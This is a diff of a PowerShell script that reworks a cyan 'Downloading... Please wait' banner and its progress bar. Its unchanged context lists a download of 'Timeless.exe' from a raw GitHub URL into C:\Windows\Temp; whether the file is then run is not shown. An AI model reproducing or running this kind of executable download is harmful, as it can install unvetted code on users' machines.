@@ -6,9 +6,12 @@ if ($width -lt 1) { $width = 80 }
 
 Write-Host (" " * $width) -BackgroundColor Cyan
 Write-Host ("Downloading...").PadRight($width) -BackgroundColor Cyan -ForegroundColor White
+$script:progressBarY = $Host.UI.RawUI.CursorPosition.Y
+Write-Host (" " * $width) -BackgroundColor Cyan
 Write-Host ("    Please wait").PadRight($width) -BackgroundColor Cyan -ForegroundColor White
 Write-Host (" " * $width) -BackgroundColor Cyan
 Write-Host ""
+$script:bottomY = $Host.UI.RawUI.CursorPosition.Y
 
 $downloads = @(
     @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
@@ -22,7 +25,9 @@ function Show-Progress {
     $filled = [int]($barWidth * $Percent / 100)
     $empty = $barWidth - $filled
     $bar = '#' * $filled + '-' * $empty
-    Write-Host "`r  [$bar] $Percent%  " -NoNewline
+    $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, $script:progressBarY
+    Write-Host ("  [$bar] $Percent%").PadRight($width) -BackgroundColor Cyan -ForegroundColor White -NoNewline
+    $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, $script:bottomY
 }
 
 $totalFiles = $downloads.Count
